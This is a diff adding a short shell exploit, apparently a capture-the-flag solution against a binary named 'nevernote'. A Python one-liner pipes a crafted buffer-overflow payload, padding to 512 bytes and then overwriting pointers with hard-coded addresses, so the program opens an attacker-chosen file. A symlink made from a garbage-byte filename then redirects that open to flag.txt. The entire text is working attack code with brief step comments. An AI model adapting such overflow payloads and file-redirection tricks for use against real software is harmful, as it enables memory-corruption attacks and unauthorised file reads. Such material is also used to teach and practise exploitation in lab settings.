@@ -1,0 +1,6 @@
+{ printf "somepersonname\na\n"; python -c "print 'flag.txt\x00' + 'x'*(512-9)+ 'flag\x60\xc0\x04\x08xxxxxxxxxxxxebp_\x00\x8a\x04\x08\x60\xc0\x04\x08'";  } | /home/nevernote/nevernote
+
+# now you get fopen() of some random crap
+
+ln -s /home/nevernote/flag.txt $(printf "\370\377\j\002")
+# now run nevernote again
